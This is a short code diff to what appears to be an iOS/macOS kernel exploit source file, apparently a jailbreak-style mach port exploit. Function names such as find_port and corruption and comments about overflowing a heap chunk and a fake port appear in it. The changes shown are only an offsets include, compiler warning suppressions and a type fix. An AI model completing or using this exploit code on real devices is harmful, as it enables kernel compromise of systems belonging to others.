@@ -12,10 +12,19 @@
 #import <pthread.h>
 #import <mach-o/loader.h>
 
+#import "offsets.h"
+
 #define IO_BITS_ACTIVE 0x80000000
 #define IKOT_TASK 2
 #define IKOT_IOKIT_CONNECT 29
 #define IKOT_CLOCK 25
+
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wincompatible-pointer-types"
+#pragma clang diagnostic ignored "-Wint-conversion"
+#pragma clang diagnostic ignored "-Wsign-conversion"
+#pragma clang diagnostic ignored "-Wshorten-64-to-32"
+#pragma clang diagnostic ignored "-Wpointer-sign"
 
 typedef natural_t not_natural_t;
 
@@ -54,7 +63,7 @@ mach_port_t find_port() {
     memset(odata, 0x42, 0x0);
     
     
-    uint64_t rsz = 0x100; // alloc size;
+    mach_msg_type_number_t rsz = 0x100; // alloc size;
     fdata -= rsz + 0x100; // overflow full chunk
     
     //struct not_essers_ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
@@ -295,3 +304,4 @@ corp_ret_t corruption(mach_port_t foundport) {
 //
 //@end
 
+#pragma clang diagnostic pop
